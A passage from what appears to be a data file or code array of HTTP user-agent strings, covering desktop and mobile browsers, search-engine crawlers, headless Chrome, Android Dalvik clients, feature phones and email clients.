"Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
"Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
"Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
"Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
"Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
"Wget/1.17.1 (linux-gnu)",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
"Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3809.87 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/68.0.3419.0 Safari/537.36",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
"Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.8.0",
"WirtschaftsWoche-iOS-1.1.14-20200824.1315",
"[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
"Outlook-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
"DoCoMo/2.0 P903i(c100;TB;W24H12)",
"DoCoMo/2.0 P903i",
"DoCoMo/2.0 SH10C(c500;TB;W16H12)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlook 14.0.7162; ms-office; MSOffice 14)",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Link/6.3.0.0.0",
"HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
"com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
"Mogujie4Android/NAMhuawei/1290",
"Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Gecko/13.0 Firefox/13.0",
"Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1",
"Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebKit/534.15 (KHTML, like Gecko) CrMo/32.0.1005.22 Mobile Safari/534.15",
"Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
"nokia-7.1-safari",
"NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
"Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
"Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
"Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Android; Mobile; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Android; Tablet; rv:30.0) Gecko/30.0 Firefox/30.0",
"Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Gecko/20100101 Firefox/10.0 Fennec/10.0",
"Mozilla/5.0 (Mobile; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Tablet; rv:26.0) Gecko/26.0 Firefox/26.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36",
"Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/",
"Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0",
"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
"Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
"Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
"Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
"Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",
"Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
"Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
